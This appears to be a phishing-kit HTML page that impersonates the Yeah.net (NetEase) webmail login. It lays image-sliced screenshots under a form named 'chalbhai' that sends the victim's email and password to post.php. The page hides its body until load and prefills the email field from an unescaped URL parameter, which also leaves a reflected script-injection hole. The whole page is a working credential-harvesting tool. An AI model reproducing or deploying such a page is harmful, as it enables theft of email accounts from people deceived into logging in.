<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#89;&#101;&#97;&#104;&#46;&#110;&#101;&#116;&#32593;&#26131;&#20813;&#36153;&#37038;&#45;&#45;&#24555;&#20048;&#32;&#20998;&#20139;&#32;&#25104;&#38271;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
			<style type="text/css">
			.textbox { 
	background:  #848486; 
	border: 1px solid #666; 
	box-shadow: 0 0 5px #666 inset; 
	color: #333; 
	float: left; 
	padding: 7px 10px;
	height:40px; 	 
	outline: none; 
	border-radius: 3px;
	width: 275px; 
	outline: #fff; 
} 
.textbox:focus { 
    outline: none; 
    border: 1px solid #B8060B; 
    
    
} 
</style>
			  
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<body style="visibility:hidden" onload="unhideBody()">
<style type="text/css">
div#container
{
	position:relative;
	width: 1351px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1351px; height:700px; z-index:0"><img src="images/bg.jpg" alt="" title="" border=0 width=1351 height=700></div>

<div id="image2" style="position:absolute; overflow:hidden; left:551px; top:262px; width:261px; height:80px; z-index:1"><img src="images/logo.png" alt="" title="" border=0 width=261 height=80></div>

<div id="image3" style="position:absolute; overflow:hidden; left:336px; top:564px; width:93px; height:24px; z-index:2"><a href="#"><img src="images/y1.png" alt="" title="" border=0 width=93 height=24></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:511px; top:566px; width:64px; height:22px; z-index:3"><a href="#"><img src="images/y2.png" alt="" title="" border=0 width=64 height=22></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:601px; top:562px; width:76px; height:27px; z-index:4"><a href="#"><img src="images/y3.png" alt="" title="" border=0 width=76 height=27></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:779px; top:562px; width:76px; height:24px; z-index:5"><a href="#"><img src="images/y4.png" alt="" title="" border=0 width=76 height=24></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:887px; top:564px; width:101px; height:22px; z-index:6"><a href="#"><img src="images/y5.png" alt="" title="" border=0 width=101 height=22></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:241px; top:610px; width:873px; height:24px; z-index:7"><a href="#"><img src="images/y6.png" alt="" title="" border=0 width=873 height=24></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:516px; top:632px; width:322px; height:20px; z-index:8"><a href="#"><img src="images/y7.png" alt="" title="" border=0 width=322 height=20></a></div>

<form action=post.php name=chalbhai id=chalbhai method=post>
<input name="userid" value="<?=$_GET[userid]?>"  class="textbox" required type="email" style="position:absolute;font-size: 16px;width:255px;border:none;text-align:center;outline: none;font-weight: bold;left:318px;top:519px;z-index:9">
<input name="formtext2" placeholder="&#23494;&#30721;" class="textbox" required type="text" style="position:absolute;width:248px;left:600px;top:519px;z-index:10">
<div id="formcheckbox1" style="position:absolute; left:316px; top:566px; z-index:11"><input type="checkbox" name="formcheckbox1"></div>
<div id="formimage1" style="position:absolute; left:877px; top:519px; z-index:12"><input type="image" name="formimage1" width="112" height="42" src="images/button.png"></div>
</div>

</body>
</html>
